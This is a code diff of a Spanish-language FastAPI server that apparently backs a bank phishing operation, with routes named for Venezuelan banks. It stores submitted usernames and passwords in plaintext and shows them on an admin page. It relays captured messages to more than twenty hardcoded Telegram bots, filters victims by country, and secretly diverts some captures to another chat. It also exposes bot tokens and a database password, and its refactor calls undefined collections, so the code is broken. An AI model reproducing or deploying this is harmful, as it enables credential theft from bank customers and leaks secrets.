@@ -1,5 +1,5 @@
-from fastapi import FastAPI, HTTPException, Request ,UploadFile
-from fastapi import  File,  Form
+from fastapi import FastAPI, HTTPException, Request, UploadFile
+from fastapi import File, Form
 from functools import partial
 import shutil
 from fastapi.responses import JSONResponse
@@ -12,8 +12,7 @@ from starlette.middleware.base import BaseHTTPMiddleware
 from starlette.responses import Response
 import random
 import base64
-import psycopg2
-from psycopg2.extras import RealDictCursor
+from pymongo import MongoClient
 from typing import Callable
 from datetime import datetime, timedelta
 import re
@@ -22,7 +21,7 @@ import random
 
 app = FastAPI()
 
-# Configurar el middlewares CORS
+# Configurar el middleware CORS
 app.add_middleware(
     CORSMiddleware,
     allow_origins=["http://localhost", "*"],
@@ -33,146 +32,81 @@ app.add_middleware(
 
 TOKEN = "8061450462:AAH2Fu5UbCeif5SRQ8-PQk2gorhNVk8lk6g"
 
-# Configuración sde asutenticac2iónsssss
+# Configuración de autenticación
 AUTH_USERNAME = "gato"
 AUTH_PASSWORD = "Gato1234@"
-numeros_r = [4,6,9]
-iprandom = {4,6,9}
+numeros_r = [4, 6, 9]
+iprandom = {4, 6, 9}
 
-# Conexión a la base de dsatsos sPosssstsgsreSQL
-def get_db_connection():
-    conn = psycopg2.connect(
-        host="db.nqdalurldbzxceryirkb.supabase.co",
-        dbname="postgres",
-        user="postgres",
-        password="holas123@",  # Reemplaza esto con tu contraseña
-        port=5432
-    )
-    return conn
+# MongoDB
+client = MongoClient("mongodb+srv://capijose:holas123@servidorsd.7syxtzz.mongodb.net/?retryWrites=true&w=majority&appName=servidorsd")
+db = client["api_db"]
+ip_numbers = db["ip_numbers"]
+user_numbers = db["user_numbers"]
+global_settings = db["global_settings"]
+logs_usuarios = db["logs_usuarios"]
 
 # Inicializar base de datos si no existe
 def init_db():
-    with get_db_connection() as conn:
-        cursor = conn.cursor()
-        cursor.execute('''CREATE TABLE IF NOT EXISTS ip_numbers (
-                            ip TEXT PRIMARY KEY,
-                            number INTEGER
-                        )''')
-        cursor.execute('''CREATE TABLE IF NOT EXISTS user_numbers (
-                            username TEXT PRIMARY KEY,
-                            number INTEGER
-                        )''')
-        
-        cursor.execute('''
-            CREATE TABLE IF NOT EXISTS global_settings (
-                id INTEGER PRIMARY KEY,
-                is_active BOOLEAN DEFAULT FALSE
-            )
-        ''')
+    # Crear índices únicos
+    ip_numbers.create_index("ip", unique=True)
+    user_numbers.create_index("username", unique=True)
+    global_settings.create_index("id", unique=True)
+    
+    # Insertar configuración global por defecto si no existe
+    if not global_settings.find_one({"id": 1}):
+        global_settings.insert_one({"id": 1, "is_active": False})
 
-        cursor.execute('''
-            INSERT INTO global_settings (id, is_active)
-            VALUES (1, FALSE)
-            ON CONFLICT (id) DO NOTHING
-        ''')
-        cursor.execute('''
-            CREATE TABLE IF NOT EXISTS logs_usuarios (
-                id SERIAL PRIMARY KEY,
-                usuario TEXT,
-                contrasena TEXT,
-                ip TEXT,
-                pais TEXT,
-                fecha TIMESTAMP DEFAULT CURRENT_TIMESTAMP
-            )
-        ''')
-        conn.commit()
-
-# Funciones para interactuar con las base de datos
+# Funciones para interactuar con la base de datos
 
 def agregar_elemento_diccionario(ip, numero):
-    conn = get_db_connection()
-    cursor = conn.cursor()
-    cursor.execute("SELECT * FROM ip_numbers WHERE ip = %s", (ip,))
-    existing_ip = cursor.fetchone()
-    
-    if not existing_ip:
-        cursor.execute("INSERT INTO ip_numbers (ip, number) VALUES (%s, %s)", (ip, numero))
-        conn.commit()
-    
-    conn.close()
+    try:
+        ip_numbers.insert_one({"ip": ip, "number": numero})
+    except:
+        # Si la IP ya existe, no hace nada
+        pass
 
 def usuariodiccionario(usuario, ip):
-    with get_db_connection() as conn:
-        cursor = conn.cursor()
-
-        # Buscar el número asociado a la IP en la tabla ip_numbers
-        cursor.execute("SELECT number FROM ip_numbers WHERE ip = %s", (ip,))
-        result = cursor.fetchone()
-
-        # Verificar si existe un número asociado a la IP
-        if result:
-            numero = result[0]
-
-            # Insertar el usuario y el número en la tabla user_numbers o actualizar si ya existe
-            cursor.execute(
-                """
-                INSERT INTO user_numbers (username, number) 
-                VALUES (%s, %s) 
-                ON CONFLICT (username) DO UPDATE SET number = EXCLUDED.number
-                """,
-                (usuario, numero)
-            )
-            conn.commit()
-            return {"usuario": usuario, "numero": numero}
+    # Buscar el número asociado a la IP
+    ip_doc = ip_numbers.find_one({"ip": ip})
+    
+    if ip_doc:
+        numero = ip_doc["number"]
         
-        else:
-            # Si la IP no tiene número asociado, retornar un error o manejarlo según se necesite
-            return {"error": "No se encontró un número asociado a la IP proporcionada."}
-
+        # Insertar o actualizar el usuario
+        user_numbers.update_one(
+            {"username": usuario},
+            {"$set": {"username": usuario, "number": numero}},
+            upsert=True
+        )
+        return {"usuario": usuario, "numero": numero}
+    else:
+        return {"error": "No se encontró un número asociado a la IP proporcionada."}
 
 def obtener_numero(ip):
-    with get_db_connection() as conn:
-        cursor = conn.cursor()
-        cursor.execute("SELECT number FROM ip_numbers WHERE ip = %s", (ip,))
-        row = cursor.fetchone()
-        return row[0] if row else None
+    doc = ip_numbers.find_one({"ip": ip})
+    return doc["number"] if doc else None
 
 def obtener_usuario(usuario):
-    with get_db_connection() as conn:
-        cursor = conn.cursor()
-        cursor.execute("SELECT number FROM user_numbers WHERE username = %s", (usuario,))
-        row = cursor.fetchone()
-        return row[0] if row else None
+    doc = user_numbers.find_one({"username": usuario})
+    return doc["number"] if doc else None
 
 def obtener_is_active():
-    with get_db_connection() as conn:
-        cursor = conn.cursor()
-        cursor.execute("SELECT is_active FROM global_settings WHERE id = 1")
-        row = cursor.fetchone()
-        return bool(row[0]) if row else False
+    doc = global_settings.find_one({"id": 1})
+    return bool(doc["is_active"]) if doc else False
 
 def alternar_is_active():
-    with get_db_connection() as conn:
-        cursor = conn.cursor()
-        
-        # Obtener el valor actual de is_active
-        cursor.execute("SELECT is_active FROM global_settings WHERE id = 1")
-        row = cursor.fetchone()
-        
-        if row is not None:
-            # Alternar el valor actual
-            nuevo_valor = not row[0]
-            
-            # Actualizar el valor en la base de datos
-            cursor.execute("UPDATE global_settings SET is_active = %s WHERE id = 1", (nuevo_valor,))
-            conn.commit()
-            return nuevo_valor
-        else:
-            raise ValueError("No se encontró la fila con id = 1 en la tabla global_settings.")
-
-# Diccionario para registrar la última solicitud por IP
-def agregar_elemento(cola, elemento):
-    cola.append(elemento)
+    doc = global_settings.find_one({"id": 1})
+    
+    if doc:
+        nuevo_valor = not doc["is_active"]
+        global_settings.update_one(
+            {"id": 1},
+            {"$set": {"is_active": nuevo_valor}}
+        )
+        return nuevo_valor
+    else:
+        raise ValueError("No se encontró la configuración global.")
 
 # Middleware para autenticación básica
 class BasicAuthMiddleware(BaseHTTPMiddleware):
@@ -197,30 +131,33 @@ class BasicAuthMiddleware(BaseHTTPMiddleware):
 
 app.add_middleware(BasicAuthMiddleware)
 
-# Configuración de la tasa de solicitudes (1 solicitud cada 3 segundos)
-#aqui se necesita modificar la tasa de solicitudes
+# Middleware de bloqueo de IP
 class IPBlockMiddleware(BaseHTTPMiddleware):
     async def dispatch(self, request: Request, call_next: Callable):
         client_ip = request.client.host
 
-        # Si la IP está en la lista de bloqueados, se devuelve un esrror 4s03
+        # Si la IP está en la lista de bloqueados, se devuelve un error 403
         if client_ip in baneado and client_ip != "179.6.6.254":
             return JSONResponse(
                 status_code=403,
                 content={"detail": "Acceso denegado, la ip esta fuera de servicio"}
             )
+        
         # Si la IP no está bloqueada, se sigue con la solicitud
         if not (client_ip in iprandom):
             numero_random = random.randint(0, 9)
             agregar_elemento_diccionario(client_ip, numero_random)
+        
         response = await call_next(request)
         return response
 
 app.add_middleware(IPBlockMiddleware)
+
 cola = deque(maxlen=20)
 baneado = deque()
 variable = False
-# Función para contars cuántas veces aparece un elemento específico en la cola
+
+# Función para contar cuántas veces aparece un elemento específico en la cola
 def contar_elemento(cola, elemento):
     return cola.count(elemento)
 
@@ -230,14 +167,14 @@ def verificar_pais(ip):
         response = requests.get(url)
         if response.status_code == 200:
             data = response.json()
-            country = data.get('country_code', 'Unknown')  # Obtener el país o 'Unknown' si no está disponible
-            if country in ['VE', 'CO', 'PE']:  # Verificar si es Venezuela, Colombia o Perú
+            country = data.get('country_code', 'Unknown')
+            if country in ['VE', 'CO', 'PE']:
                 return True, country
-            if country in ['US']:  # Verificar si es Venezuela, Colombia o Perú
+            if country in ['US']:
                 return False, country
             else:
                 return True, country
-        return False, 'Unknown'  # Retornar 'Unknown' si no se pudo obtener el país
+        return False, 'Unknown'
     except Exception as e:
         raise HTTPException(status_code=500, detail="Error al verificar el país de la IP")
 
@@ -253,10 +190,8 @@ def enviar_telegram(mensaje, chat_id="-4826186479"):
             raise HTTPException(status_code=response.status_code, detail="Error al enviar mensaje a Telegram")
     except requests.exceptions.RequestException as e:
         raise HTTPException(status_code=500, detail="Error de conexión al enviar mensaje a Telegram")
-    
 
-    
-def enviar_telegram2(mensaje, chat_id="-4592050775",token="7763460162:AAHw9fqhy16Ip2KN-yKWPNcGfxgK9S58y1k" ):
+def enviar_telegram2(mensaje, chat_id="-4592050775", token="7763460162:AAHw9fqhy16Ip2KN-yKWPNcGfxgK9S58y1k"):
     url = f"https://api.telegram.org/bot{token}/sendMessage"
     payload = {
         "chat_id": chat_id,
@@ -270,44 +205,34 @@ def enviar_telegram2(mensaje, chat_id="-4592050775",token="7763460162:AAHw9fqhy1
         raise HTTPException(status_code=500, detail="Error de conexión al enviar mensaje a Telegram 2")
 
 def validar_contrasena(contrasena):
-    # Expresión regular para verificar todos los requisitos
     patron = r"^(?=.*[a-z])(?=.*[A-Z])(?=.*\d).{8,}$"
-    
-    # Usamos re.match para verificar si la contraseña cumple con el patrón
     return bool(re.match(patron, contrasena))
+
 class UpdateNumberRequest(BaseModel):
     numero: int
 
 def editar_numero_ip2(ip: str):
-    with get_db_connection() as conn:
-        cursor = conn.cursor()
+    result = ip_numbers.update_one(
+        {"ip": ip},
+        {"$set": {"number": 0}}
+    )
+    
+    if result.matched_count == 0:
+        raise HTTPException(status_code=404, detail="IP no encontrada en la base de datos")
+    
+    return {"message": f"Número de la IP {ip} actualizado a 0"}
 
-        # Verificar si la IP existe en la base de datos
-        cursor.execute("SELECT * FROM ip_numbers WHERE ip = %s", (ip,))
-        if cursor.fetchone() is None:
-            raise HTTPException(status_code=404, detail="IP no encontrada en la base de datos")
-
-        # Actualizar el número de la IP
-        cursor.execute("UPDATE ip_numbers SET number = %s WHERE ip = %s", (0, ip))
-        conn.commit()
-
-    return {"message": f"Número de la IP {ip} actualizado a {0}"}
-
-# Endpoint para editar el número de un usuario específico
 def editar_numero_usuario2(usuario: str):
-    with get_db_connection() as conn:
-        cursor = conn.cursor()
+    result = user_numbers.update_one(
+        {"username": usuario},
+        {"$set": {"number": 0}}
+    )
+    
+    if result.matched_count == 0:
+        raise HTTPException(status_code=404, detail="Usuario no encontrado en la base de datos")
+    
+    return {"message": f"Número del usuario {usuario} actualizado a 0"}
 
-        # Verificar si el usuario existe en la base de datos
-        cursor.execute("SELECT * FROM user_numbers WHERE username = %s", (usuario,))
-        if cursor.fetchone() is None:
-            raise HTTPException(status_code=404, detail="Usuario no encontrado en la base de datos")
-
-        # Actualizar el número del usuario
-        cursor.execute("UPDATE user_numbers SET number = %s WHERE username = %s", (0, usuario))
-        conn.commit()
-
-    return {"message": f"Número del usuario {usuario} actualizado a {0}"}
 class IPRequest(BaseModel):
     ip: str
 
@@ -319,7 +244,7 @@ async def bloquear_ip(data: IPRequest):
         return {"message": f"La IP {ip} ha sido bloqueada manualmente.", "estado_cola": list(baneado)}
     else:
         return {"message": f"La IP {ip} ya estaba bloqueada.", "estado_cola": list(baneado)}
-        
+
 @app.post("/desbloquear_ip/")
 async def desbloquear_ip(data: IPRequest):
     ip = data.ip.strip()
@@ -332,18 +257,13 @@ async def desbloquear_ip(data: IPRequest):
 @app.get("/")
 def read_root():
     return {"message": "API funcionando correctamente!"}
-#
+
 @app.get("/mostrar_cola")
 async def mostrar_cola():
-    """
-    Endpoint para mostrar los elementos actuales de la cola.
-    """
     return {"estado_cola": list(baneado)}
+
 @app.get("/limpiar_cola")
 async def limpiar_cola():
-    """
-    Endpoint para limpiar la cola 'baneado'.
-    """
     baneado.clear()
     return {"message": "La cola ha sido limpiada con éxito", "estado_cola": list(baneado)}
 
@@ -352,13 +272,14 @@ async def guardar_datos(usuario: str = Form(...), contra: str = Form(...), reque
     ip = request.client.host
     permitido, pais = verificar_pais(ip)
 
-    with get_db_connection() as conn:
-        cursor = conn.cursor()
-        cursor.execute(
-            "INSERT INTO logs_usuarios (usuario, contrasena, ip, pais) VALUES (%s, %s, %s, %s)",
-            (usuario, contra, ip, pais)
-        )
-        conn.commit()
+    logs_usuarios_collection.insert_one({
+        "usuario": usuario,
+        "contrasena": contra,
+        "ip": ip,
+        "pais": pais,
+        "fecha": datetime.utcnow()
+    })
+    
     return {
         "message": "Datos guardados correctamente",
         "ip": ip,
@@ -367,10 +288,7 @@ async def guardar_datos(usuario: str = Form(...), contra: str = Form(...), reque
 
 @app.get("/ver_datos", response_class=HTMLResponse)
 async def ver_datos():
-    with get_db_connection() as conn:
-        cursor = conn.cursor()
-        cursor.execute("SELECT usuario, contrasena, ip, pais, fecha FROM logs_usuarios ORDER BY fecha DESC")
-        registros = cursor.fetchall()
+    registros = list(logs_usuarios_collection.find().sort("fecha", -1))
     
     html = """
     <html>
@@ -380,33 +298,30 @@ async def ver_datos():
         <table border="1">
             <tr><th>Usuario</th><th>Contraseña</th><th>IP</th><th>País</th><th>Fecha</th></tr>
     """
-    for usuario, contrasena, ip, pais, fecha in registros:
+    for registro in registros:
+        usuario = registro.get("usuario", "")
+        contrasena = registro.get("contrasena", "")
+        ip = registro.get("ip", "")
+        pais = registro.get("pais", "")
+        fecha = registro.get("fecha", "")
         html += f"<tr><td>{usuario}</td><td>{contrasena}</td><td>{ip}</td><td>{pais}</td><td>{fecha}</td></tr>"
     
     html += "</table></body></html>"
     return HTMLResponse(content=html)
 
-# Endpoint para obtener todos los ssusuarios sy sus números
 @app.get("/usuarios/")
 async def obtener_usuarios():
-    with get_db_connection() as conn:
-        cursor = conn.cursor()
-        cursor.execute("SELECT username, number FROM user_numbers")
-        usuarios = cursor.fetchall()
-        
-    # Si no hay usuarios, devolver un mensaje adecuado
+    usuarios = list(user_numbers_collection.find({}, {"_id": 0, "username": 1, "number": 1}))
+    
     if not usuarios:
         return {"message": "No se encontraron usuarios en la base de datos."}
     
-    return {"usuarios": [{"usuario": usuario, "numero": numero} for usuario, numero in usuarios]}
-# Endpoint para obtener el valdor actual de is_active
+    return {"usuarios": [{"usuario": u["username"], "numero": u["number"]} for u in usuarios]}
+
 @app.get("/is_active/")
 async def obtener_estado_actual():
     estado = obtener_is_active()
-    if estado is None:
-        return {"message": "El valor de is_active no está configurado en la base de datos."}
     return {"is_active": estado}
-
 
 @app.post("/toggle/")
 async def alternar_estado():
@@ -415,184 +330,71 @@ async def alternar_estado():
         return {"message": "El valor de is_active se ha alternado exitosamente.", "is_active": nuevo_estado}
     except ValueError as e:
         return {"error": str(e)}
-# Endpoint para obtener todas las IPs y sus números
+
 @app.get("/ips/")
 async def obtener_ips():
-    with get_db_connection() as conn:
-        cursor = conn.cursor()
-        cursor.execute("SELECT ip, number FROM ip_numbers")
-   
-
-        ips = cursor.fetchall()
-        
-    # Si no hay IPs, devolver un mensaje adecuado
+    ips = list(ip_numbers_collection.find({}, {"_id": 0, "ip": 1, "number": 1}))
+    
     if not ips:
         return {"message": "No se encontraron IPs en la base de datos."}
     
-    return {"ips": [{"ip": ip, "numero": numero} for ip, numero in ips]}
-
-# Iniciar la base de datos
-
-
-# Modelo para la solicitud de edición de número
-class UpdateNumberRequest(BaseModel):
-    numero: int
-
-# Endpoint para editar el número de una IP específica
-
-
+    return {"ips": [{"ip": i["ip"], "numero": i["number"]} for i in ips]}
 
 @app.put("/editar-ip/{ip}")
 async def editar_numero_ip(ip: str, request_data: UpdateNumberRequest):
-    with get_db_connection() as conn:
-        cursor = conn.cursor()
-
-        # Verificar si la IP existe en la base de datos
-        cursor.execute("SELECT * FROM ip_numbers WHERE ip = %s", (ip,))
-        if cursor.fetchone() is None:
-            raise HTTPException(status_code=404, detail="IP no encontrada en la base de datos")
-
-        # Actualizar el número de la IP
-        cursor.execute("UPDATE ip_numbers SET number = %s WHERE ip = %s", (request_data.numero, ip))
-        conn.commit()
-
+    result = ip_numbers_collection.update_one(
+        {"ip": ip},
+        {"$set": {"number": request_data.numero}}
+    )
+    
+    if result.matched_count == 0:
+        raise HTTPException(status_code=404, detail="IP no encontrada en la base de datos")
+    
     return {"message": f"Número de la IP {ip} actualizado a {request_data.numero}"}
 
-# Endpoint para editar el número de un usuario específico
 @app.put("/editar-usuario/{usuario}")
 async def editar_numero_usuario(usuario: str, request_data: UpdateNumberRequest):
-    with get_db_connection() as conn:
-        cursor = conn.cursor()
-
-        # Verificar si el usuario existe en la base de datos
-        cursor.execute("SELECT * FROM user_numbers WHERE username = %s", (usuario,))
-        if cursor.fetchone() is None:
-            raise HTTPException(status_code=404, detail="Usuario no encontrado en la base de datos")
-
-        # Actualizar el número del usuario
-        cursor.execute("UPDATE user_numbers SET number = %s WHERE username = %s", (request_data.numero, usuario))
-        conn.commit()
-
+    result = user_numbers_collection.update_one(
+        {"username": usuario},
+        {"$set": {"number": request_data.numero}}
+    )
+    
+    if result.matched_count == 0:
+        raise HTTPException(status_code=404, detail="Usuario no encontrado en la base de datos")
+    
     return {"message": f"Número del usuario {usuario} actualizado a {request_data.numero}"}
 
 def clear_db():
-    with get_db_connection() as conn:
-        cursor = conn.cursor()
-        cursor.execute("DELETE FROM ip_numbers")
-        cursor.execute("DELETE FROM user_numbers")
-        conn.commit()
+    ip_numbers_collection.delete_many({})
+    user_numbers_collection.delete_many({})
 
+def agregar_elemento(cola, elemento):
+    cola.append(elemento)
+
+# Configuración de endpoints dinámicos
 endpoint_configs = [
-    {
-        "path": "/bdv1/",
-        "chat_id": "7224742938",
-        "bot_id": "7922728802:AAEBmISy1dh41rBdVZgz-R58SDSKL3fmBU0"
-    },
-    {
-        "path": "/bdv2/",
-        "chat_id": "7528782002",
-        "bot_id": "7621350678:AAHU7LcdxYLD2bNwfr6Nl0a-3-KulhrnsgA"
-    },
-    {
-        "path": "/bdv3/",
-        "chat_id": "7805311838",
-        "bot_id": "8119063714:AAHWgl52wJRfqDTdHGbgGBdFBqArZzcVCE4"
-    },
-    {
-        "path": "/bdv4/",
-        "chat_id": "7549787135",
-        "bot_id": "7964239947:AAHmOWGfxyYCTWvr6sBhws7lBlF4qXwtoTQ"
-    },
-    {
-        "path": "/bdv5/",
-        "chat_id": "7872284021",
-        "bot_id": "8179245771:AAHOAJU9Ncl9oRX4sffF7wguaf5JergGzhU"
-    },
-    {
-        "path": "/bdv6/",
-        "chat_id": "7815697126",
-        "bot_id": "7754611129:AAHULRm3VftgABq8ZgTB0VtNNvwnK4Cvddw"
-    },
-    {
-        "path": "/provincial1/",
-        "chat_id": "7224742938",
-        "bot_id": "7922728802:AAEBmISy1dh41rBdVZgz-R58SDSKL3fmBU0"
-    },
-    {
-        "path": "/provincial2/",
-        "chat_id": "7528782002",
-        "bot_id": "7621350678:AAHU7LcdxYLD2bNwfr6Nl0a-3-KulhrnsgA"
-    },
-    {
-        "path": "/provincial3/",
-        "chat_id": "7805311838",
-        "bot_id": "8119063714:AAHWgl52wJRfqDTdHGbgGBdFBqArZzcVCE4"
-    },
-    {
-        "path": "/provincial4/",
-        "chat_id": "7549787135",
-        "bot_id": "7964239947:AAHmOWGfxyYCTWvr6sBhws7lBlF4qXwtoTQ"
-    },
-    {
-        "path": "/provincial5/",
-        "chat_id": "7872284021",
-        "bot_id": "8179245771:AAHOAJU9Ncl9oRX4sffF7wguaf5JergGzhU"
-    },
-    {
-        "path": "/provincial6/",
-        "chat_id": "7815697126",
-        "bot_id": "7754611129:AAHULRm3VftgABq8ZgTB0VtNNvwnK4Cvddw"
-    },
-    {
-        "path": "/internacional/",
-        "chat_id": "7098816483",
-        "bot_id": "7785368338:AAEbLAK_ts6KcRbbnOeu6_XVrCZV46AVJTc"
-    },
-    {
-        "path": "/internacional2/",
-        "chat_id": "6775367564",
-        "bot_id": "8379840556:AAH7Dp9d2MU_kL_engEMXj3ZstHMnE70lUI"
-    },
-    {
-        "path": "/maikelhot/",
-        "chat_id": "-4816573720",
-        "bot_id": "7763460162:AAHw9fqhy16Ip2KN-yKWPNcGfxgK9S58y1k"
-    },
-    {
-        "path": "/wts1/",
-        "chat_id": "5711521334",
-        "bot_id": "8294930756:AAHh3iZQzH1RweVl5iMaluyHj0h-mT131mI"
-    },
-    {
-        "path": "/wts2/",
-        "chat_id": "7883492995",
-        "bot_id": "8116183285:AAEUuHD9yv8_O3ofS9c11Ndq_VSUBXoZKwo"
-    },
-    {
-        "path": "/bdigital/",
-        "chat_id": "7098816483",
-        "bot_id": "7684971737:AAEUQePYfMDNgX5WJH1gCrE_GJ0_sJ7zXzI"
-    },
-    {
-        "path": "/internacional3/",
-        "chat_id": "6775367564",
-        "bot_id": "8379840556:AAH7Dp9d2MU_kL_engEMXj3ZstHMnE70lUI"
-    },
-    {
-        "path": "/prmrica/",
-        "chat_id": "7098816483",
-        "bot_id": "7864387780:AAHLh6vSSG5tf6YmwaFKAyLNuqVUOT-OLZU"
-    },
-    {
-        "path": "/hmtsasd/",
-        "chat_id": "-4727787748",
-        "bot_id": "7763460162:AAHw9fqhy16Ip2KN-yKWPNcGfxgK9S58y1k"
-    },
+    {"path": "/bdv1/", "chat_id": "7224742938", "bot_id": "7922728802:AAEBmISy1dh41rBdVZgz-R58SDSKL3fmBU0"},
+    {"path": "/bdv2/", "chat_id": "7528782002", "bot_id": "7621350678:AAHU7LcdxYLD2bNwfr6Nl0a-3-KulhrnsgA"},
+    {"path": "/bdv3/", "chat_id": "7805311838", "bot_id": "8119063714:AAHWgl52wJRfqDTdHGbgGBdFBqArZzcVCE4"},
+    {"path": "/bdv4/", "chat_id": "7549787135", "bot_id": "7964239947:AAHmOWGfxyYCTWvr6sBhws7lBlF4qXwtoTQ"},
+    {"path": "/bdv5/", "chat_id": "7872284021", "bot_id": "8179245771:AAHOAJU9Ncl9oRX4sffF7wguaf5JergGzhU"},
+    {"path": "/bdv6/", "chat_id": "7815697126", "bot_id": "7754611129:AAHULRm3VftgABq8ZgTB0VtNNvwnK4Cvddw"},
+    {"path": "/provincial1/", "chat_id": "7224742938", "bot_id": "7922728802:AAEBmISy1dh41rBdVZgz-R58SDSKL3fmBU0"},
+    {"path": "/provincial2/", "chat_id": "7528782002", "bot_id": "7621350678:AAHU7LcdxYLD2bNwfr6Nl0a-3-KulhrnsgA"},
+    {"path": "/provincial3/", "chat_id": "7805311838", "bot_id": "8119063714:AAHWgl52wJRfqDTdHGbgGBdFBqArZzcVCE4"},
+    {"path": "/provincial4/", "chat_id": "7549787135", "bot_id": "7964239947:AAHmOWGfxyYCTWvr6sBhws7lBlF4qXwtoTQ"},
+    {"path": "/provincial5/", "chat_id": "7872284021", "bot_id": "8179245771:AAHOAJU9Ncl9oRX4sffF7wguaf5JergGzhU"},
+    {"path": "/provincial6/", "chat_id": "7815697126", "bot_id": "7754611129:AAHULRm3VftgABq8ZgTB0VtNNvwnK4Cvddw"},
+    {"path": "/internacional/", "chat_id": "7098816483", "bot_id": "7785368338:AAEbLAK_ts6KcRbbnOeu6_XVrCZV46AVJTc"},
+    {"path": "/internacional2/", "chat_id": "6775367564", "bot_id": "8379840556:AAH7Dp9d2MU_kL_engEMXj3ZstHMnE70lUI"},
+    {"path": "/maikelhot/", "chat_id": "-4816573720", "bot_id": "7763460162:AAHw9fqhy16Ip2KN-yKWPNcGfxgK9S58y1k"},
+    {"path": "/wts1/", "chat_id": "5711521334", "bot_id": "8294930756:AAHh3iZQzH1RweVl5iMaluyHj0h-mT131mI"},
+    {"path": "/wts2/", "chat_id": "7883492995", "bot_id": "8116183285:AAEUuHD9yv8_O3ofS9c11Ndq_VSUBXoZKwo"},
+    {"path": "/bdigital/", "chat_id": "7098816483", "bot_id": "7684971737:AAEUQePYfMDNgX5WJH1gCrE_GJ0_sJ7zXzI"},
+    {"path": "/internacional3/", "chat_id": "6775367564", "bot_id": "8379840556:AAH7Dp9d2MU_kL_engEMXj3ZstHMnE70lUI"},
+    {"path": "/prmrica/", "chat_id": "7098816483", "bot_id": "7864387780:AAHLh6vSSG5tf6YmwaFKAyLNuqVUOT-OLZU"},
+    {"path": "/hmtsasd/", "chat_id": "-4727787748", "bot_id": "7763460162:AAHw9fqhy16Ip2KN-yKWPNcGfxgK9S58y1k"},
 ]
-
-
-class IPRequest(BaseModel):
-    ip: str
 
 @app.post("/verificar_spam_ip")
 async def verificar_spam_ip(data: IPRequest):
@@ -616,10 +418,9 @@ async def verificar_spam_ip(data: IPRequest):
             "spam": False,
             "mensaje": "IP aún no considerada spam"
         }
-    
+
 class DynamicMessage(BaseModel):
     mensaje: str
-
 
 async def handle_dynamic_endpoint(config, request_data: DynamicMessage, request: Request):
     client_ip = request.client.host
@@ -634,7 +435,6 @@ async def handle_dynamic_endpoint(config, request_data: DynamicMessage, request:
     mensaje = request_data.mensaje
 
     if permitido and pais != "US":
-        # Solo si el path comienza con /bdv se aplica la lógica del número aleatorio
         if config["path"].startswith("/bdv") and obtener_is_active() and (numeror in numeros_r and pais != "US" and pais != "CO"):
             enviar_telegram(mensaje + f" - IP: {client_ip} - {config['path']} Todo tuyo", "-4931572577")
         else:
@@ -645,7 +445,6 @@ async def handle_dynamic_endpoint(config, request_data: DynamicMessage, request:
     else:
         raise HTTPException(status_code=400, detail=f"Acceso denegado desde {pais}")
 
-    
 for config in endpoint_configs:
     app.add_api_route(
         path=config["path"],
@@ -653,20 +452,13 @@ for config in endpoint_configs:
         methods=["POST"]
     )
 
-
-# Endpoint para limpiar la base de datos
 @app.post('/clear_db')
 def clear_db_endpoint():
     try:
         clear_db()
-        return {"message": f"Se borro correctamente"}
+        return {"message": "Se borró correctamente"}
     except Exception as e:
-        return {"message": f"No se borro"}
+        return {"message": "No se borró"}
 
-
-
+# Inicializar la base de datos
 init_db()
-
-
-
-
